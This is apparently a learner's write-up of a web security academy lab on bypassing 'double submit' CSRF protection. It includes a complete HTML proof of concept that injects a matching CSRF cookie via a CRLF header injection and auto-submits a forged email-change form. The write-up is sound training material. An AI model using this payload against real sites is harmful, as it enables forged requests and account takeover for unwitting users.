# Practitioner Lab 82 : CSRF where token is duplicated in cookie

---

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

![Untitled](Practitioner%20Lab%2082%20CSRF%20where%20token%20is%20duplicated%2003f1a8e4e65b4bbca6feb2bf1d78d649/Untitled.png)

as can be seen the csrf token is the same as the cookie csrf token, Now i will try to use an invalid one to see if it works.

I changed the token and the cookie to the same and it worked. Now in my payload I know that i don’t need a valid CSRF I just need the cookie and the csrf to match.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4a00f804b46a7680c0173000bb0039.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="newemail&#64;me" />
      <input type="hidden" name="csrf" value="ByyAPqxsCY0vVemspwFTgFPn3f9R3him" />
      <input type="submit" value="Submit request" />
    </form>
  
  <img src="https://0a4a00f804b46a7680c0173000bb0039.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=ByyAPqxsCY0vVemspwFTgFPn3f9R3him%3b%20SameSite=None" onerror="document.forms[0].submit()">
      

  </body>
</html>
```

This solved the lab.